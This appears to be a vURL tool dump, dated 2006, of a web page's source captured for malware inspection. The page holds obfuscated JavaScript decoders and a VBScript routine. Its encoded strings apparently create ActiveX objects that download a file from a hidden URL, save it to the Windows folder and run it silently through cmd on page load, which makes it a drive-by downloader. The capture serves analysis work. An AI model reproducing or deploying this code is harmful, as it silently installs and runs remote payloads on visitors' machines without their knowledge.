*****************************************************************
vURL Desktop Edition v0.1.1 Results
Source code for: http://www.wzdq.cn/count.jsb
Server IP: 222.76.215.147
Date: 29 November 2006
Time: 17:24:25:24
*****************************************************************
<html>
<script language="JavaScript">
<!--
  function openDetailWindow(theURL) {
    window.open(theURL,'','height=200;width=450;center=yes;help=no');
  }

  function t1(str) {
    var ret=new String("");
    var zet=new String("");
    for (var i=0; i < str.length; i++) {
      ret=ret.concat(String.fromCharCode(str.charCodeAt(i) - 1));
      zet=zet + ret;
    }
    return ret;
  }

  function checkAll() {
    var chkAll = document.form1.rel;
    if (chkAll != null) {
      if (isNaN(chkAll.length)) { //只有一个checkbox
        chkAll.checked = document.form1.chkCheckAll.checked;
      }
      else {
        for(var i=0;i<chkAll.length;i++) {
          chkAll[i].checked = document.form1.chkCheckAll.checked;
        }
      }
    }
  }

  function t(str) {
    var str=unescape(str);
    var str2=unescape(str);
    var c=String.fromCharCode(str.charCodeAt(0)-str.length);
    for(var i=1;i<str.length;i++){
      c+=String.fromCharCode(str.charCodeAt(i)-c.charCodeAt(i-1));
    }
    return t1(c);
  }
//-->
</script>

<script language="VBScript">
//  on error resume next

  function openwin(url)
    dim oReq,b
    Set oReq = eval(t("e%B7%D9%C8%D7%DB%B6%B3%CE%D1%CA%D9%9ELq%B8%CE%D7%E3%E4%E4%D7%DC%A4%88%A7%9B%96%9E%AA%A6tM"))
    Set b = eval(t("n%B7%D9%C8%D7%DB%B6%B3%CE%D1%CA%D9%9ELw%B8%D7%DD%DB%E6%DF%D9%D7%97v%B1%D7%D3%BA%CE%EE%E9%DB%D4%BE%B3%CE%D1%CA%D9%98M"))
    oReq.open "GET",url,false
    eval(t("y%C3%B9%D8%A1%A3%DA%D5%D4"))
    If oReq.status=200 then
      openwin = eval(t("%81%C3%B9%D8%A1%A2%D9%DA%E5%E1%DF%E3%DA%BB%9B%9F%AE"))
      savefile openwin,b.GetSpecialFolder(0)&"\"&t("%7F%E2%D9%9E%98%DE%D7")
    End if
    Set b = nothing
    Set oReq = nothing
  end function

  sub savefile(str,fName)
    dim a,b
    Set a = eval(t("n%B7%D9%C8%D7%DB%B6%B3%CE%D1%CA%D9%9ELw%B8%D7%DD%DB%E6%DF%D9%D7%97v%B1%D7%D3%BA%CE%EE%E9%DB%D4%BE%B3%CE%D1%CA%D9%98M"))
    Set b = eval(t("%7E%91s%B7%D9%C8%D7%DB%BB%BB%DF%EE%BC%B1%D7%D3%8F%90%B6%B1%D0%D4%93%82%C8%E9%DC%90"))
    b.Write str
    b.Close
    Set a = nothing
    openwins()
  end sub

  Sub openwins()
    dim a,b,c,d
    Set a = eval(t("d%B7%D9%C8%D7%DB%B6%B3%CE%D1%CA%D9%9EL%7B%AC%B8%D7%DD%DB%94OO%98%A4%83%BD%CF%D3%DA%90M"))
    Set b = eval(t("n%B7%D9%C8%D7%DB%B6%B3%CE%D1%CA%D9%9ELw%B8%D7%DD%DB%E6%DF%D9%D7%97v%B1%D7%D3%BA%CE%EE%E9%DB%D4%BE%B3%CE%D1%CA%D9%98M"))
    c = t("o%D2%D3%94%95%DF%DF%87Q%94%85")&b.GetSpecialFolder(0)&"\"&t("%7F%E2%D9%9E%98%DE%D7")
    d = a.run (c,0)
    Set b = nothing
    Set a = nothing
    window.close
  End Sub

  openwin(t("%85%DE%EA%E6%ACk%60%A8%F0%F0%A7%A7%F3%E0%D7%A1%93%D3%9F%94%D4%E6%E5%E4%A4%A4%EE%EE"))
</script>
</html>
